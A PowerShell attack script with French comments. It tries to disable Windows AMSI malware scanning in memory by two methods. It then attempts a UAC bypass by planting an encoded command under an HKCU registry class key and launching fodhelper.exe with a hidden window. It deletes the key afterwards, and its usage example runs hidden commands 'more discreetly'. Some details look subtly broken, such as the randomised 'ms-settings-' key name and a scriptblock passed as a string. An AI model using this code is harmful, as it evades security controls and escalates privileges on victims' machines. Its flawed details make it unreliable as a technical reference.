function Invoke-FodhelperBypass {
    param(
        [string]$Command = "Start-Process calc.exe"
    )

    # Contournement AMSI en mémoire (plusieurs méthodes)
    try {
        # Méthode 1 : Patch mémoire AMSI
        $Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        $Ref.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
        
        # Méthode 2 alternative (si la première échoue)
        [Runtime.InteropServices.Marshal]::WriteInt32(
            [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField(
                'amsiContext', [Reflection.BindingFlags]'NonPublic,Static'
            ).GetValue($null), 0x41414141
        )
    } catch {
        Write-Verbose "AMSI bypass échoué, continuation quand même..."
    }

    # Encodage de la commande pour éviter les problèmes de parsing
    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
    $EncodedCommand = [Convert]::ToBase64String($Bytes)
    $FinalPayload = "powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand $EncodedCommand"

    # Configuration du bypass UAC
    $RandomKey = 'ms-settings-' + (-join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_}))
    $RegPath = "HKCU:\Software\Classes\$RandomKey\Shell\Open\command"

    try {
        # Création des clés de registre
        New-Item -Path $RegPath -Force | Out-Null
        New-ItemProperty -Path $RegPath -Name "DelegateExecute" -Value "" -Force | Out-Null
        Set-ItemProperty -Path $RegPath -Name "(Default)" -Value $FinalPayload -Force

        # Exécution du bypass
        Start-Process "fodhelper.exe" -WindowStyle Hidden -ErrorAction Stop

        # Attente pour que l'action se complète
        Start-Sleep -Seconds 3
        Write-Host "[+] Bypass UAC exécuté avec succès" -ForegroundColor Green
    }
    catch {
        Write-Warning "[-] Erreur pendant l'exécution: $_"
    }
    finally {
        # Nettoyage silencieux
        Remove-Item -Path "HKCU:\Software\Classes\$RandomKey" -Recurse -Force -ErrorAction SilentlyContinue
    }
}

# Exemple d'utilisation (plus discret qu'un simple calc.exe)
Invoke-FodhelperBypass -Command {
    $proc = Start-Process "cmd.exe" -ArgumentList "/c whoami > C:\temp\test.txt" -WindowStyle Hidden -PassThru
    if($proc.Id) { $proc.WaitForExit() }
}
